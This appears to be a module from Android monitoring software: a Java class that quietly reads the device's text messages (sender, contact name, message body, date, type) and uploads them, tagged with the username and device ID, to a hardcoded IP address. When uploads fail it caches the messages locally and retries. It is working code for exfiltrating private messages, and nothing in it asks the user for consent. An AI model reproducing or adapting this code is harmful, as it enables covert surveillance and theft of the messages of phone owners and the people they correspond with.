package com.os.logger.track;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.monitor.greendao.SmsEntity;
import com.monitor.greendao.SmsEntityDao;
import com.os.logger.DBHelper;
import com.os.logger.LogUtil;
import com.os.logger.PreferenceUtil;
import com.os.logger.TelephonyHelper;
import com.os.logger.UploadHelper;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * Created by Alan on 16/5/9.
 */
public class SmsTrack extends BaseTrack {

    private static String sUrl = "http://139.196.39.184/send_msg";
    public SmsTrack(Context context) {
        super(context);
    }

    private List<SmsItem> getSms(Context context) {
        Uri uri = Uri.parse("content://sms/");
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        String selection = "date > ?";
        String[] selectionArgs = {String.valueOf(PreferenceUtil.getLong(context,
                PreferenceUtil.KEY_SMS_LATEST_DATE, 0))};

        Cursor cursor = context.getContentResolver().query(uri, projection, selection,
                selectionArgs, "date desc");
        if (cursor == null) {
            return null;
        }

        PreferenceUtil.saveValue(context, PreferenceUtil.KEY_SMS_LATEST_DATE,
                System.currentTimeMillis());

        if (cursor.moveToFirst()) {
            List<SmsItem> list = new ArrayList<>();
//            int indexOfId = cursor.getColumnIndex("_id");
            int indexOfAddress = cursor.getColumnIndex("address");
            int indexOfPerson = cursor.getColumnIndex("person");
            int indexOfBody = cursor.getColumnIndex("body");
            int indexOfDate = cursor.getColumnIndex("date");
            int indexOfType = cursor.getColumnIndex("type");
            do {
                String address = cursor.getString(indexOfAddress);
                String person = cursor.getString(indexOfPerson);
                long date = cursor.getLong(indexOfDate);
                String body = cursor.getString(indexOfBody);
                int type = cursor.getInt(indexOfType);

                SmsItem item = new SmsItem();
                item.setAddress(address);
                item.setBody(body);
                item.setDate(date);
                item.setPerson(person);
                item.setType(type);

                list.add(item);

            } while (cursor.moveToNext());
            cursor.close();
            return list;
        }
        cursor.close();
        return null;

    }

    @Override
    public void sync() {
        if (noNetConnection()){
            return;
        }

        reportCachedEntities();

        List<SmsItem> list = getSms(getContext());
        if (list != null) {
            for (SmsItem item : list) {
                reportOrSave(item);
            }
        }
    }

    private void reportCachedEntities(){
        SmsEntityDao dao = DBHelper.getInstance().getDaoSession().getSmsEntityDao();
        List<SmsEntity> list = dao.queryBuilder().orderAsc(SmsEntityDao.Properties.Date).list();
        if (list!=null){
            for (SmsEntity entity:list){
                reportOrNothing(entity);
            }
        }

    }

    private void reportOrSave(final SmsItem item){
        UploadHelper.getInstance().upload(sUrl, toJson(item), new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                save(item);
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!isSuccessFul(response)){
                    save(item);
                }
            }
        });
    }

    protected String toJson(SmsItem item){
        JSONObject object = new JSONObject();
        try {
            object.put("id",item.getId());
            object.put("address",item.getAddress());
            object.put("person",item.getPerson());
            object.put("date",item.getDate());
            object.put("body",item.getBody());
            object.put("type",item.getType());
            String userName = PreferenceUtil.getString(getContext(),PreferenceUtil.KEY_USER_NAME);
            object.put("username",userName);
            object.put("deviceid", TelephonyHelper.getDeviceId(getContext()));
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return object.toString();
    }

    private void reportOrNothing(final SmsEntity entity){
        UploadHelper.getInstance().upload(sUrl, toJson(entity), new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {

            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (isSuccessFul(response)){
                    delete(entity);
                }else{
                    increaseRetryCount(entity);
                }
            }
        });
    }

    private boolean isSuccessFul(Response response) {
        if (!response.isSuccessful()){
            response.body().close();
            return false;
        }
        String body = null;
        try {
            body = response.body().string();
            LogUtil.e("sms:"+ body);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return body != null && !body.contains("errorno");
    }

    private void delete(SmsEntity entity){
        SmsEntityDao dao = DBHelper.getInstance().getDaoSession().getSmsEntityDao();
        dao.delete(entity);
    }

    private void increaseRetryCount(SmsEntity entity){
        int retryCount = entity.getRetryCount();
        if (retryCount >=3){
            delete(entity);
            return;
        }
        SmsEntityDao dao = DBHelper.getInstance().getDaoSession().getSmsEntityDao();
        entity.setRetryCount(retryCount + 1);
        dao.update(entity);
    }

    private String toJson(SmsEntity entity){
        JSONObject object = new JSONObject();
        try {
            object.put("id",entity.getId());
            object.put("address",entity.getAddress());
            object.put("person",entity.getPerson());
            object.put("date",entity.getDate());
            object.put("body",entity.getBody());
            object.put("type",entity.getType());

            String userName = PreferenceUtil.getString(getContext(),PreferenceUtil.KEY_USER_NAME);
            object.put("username",userName);
            object.put("deviceid", TelephonyHelper.getDeviceId(getContext()));
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return object.toString();
    }

    private void save(SmsItem item){
        SmsEntityDao dao = DBHelper.getInstance().getDaoSession().getSmsEntityDao();
        SmsEntity entity = new SmsEntity(item.getId(),item.getAddress(),item.getPerson(),
                item.getDate(),item.getBody(),item.getType(),1);
        dao.insertOrReplace(entity);
    }


    @Override
    public void destroy() {

    }

    @Override
    public void ready() {
//        if (noNetConnection()){
//            return;
//        }
//
//        reportCachedEntities();
//
//        List<SmsItem> list = getSms(getContext());
//        if (list != null) {
//            for (SmsItem item : list) {
//                reportOrSave(item);
//            }
//        }
    }
}
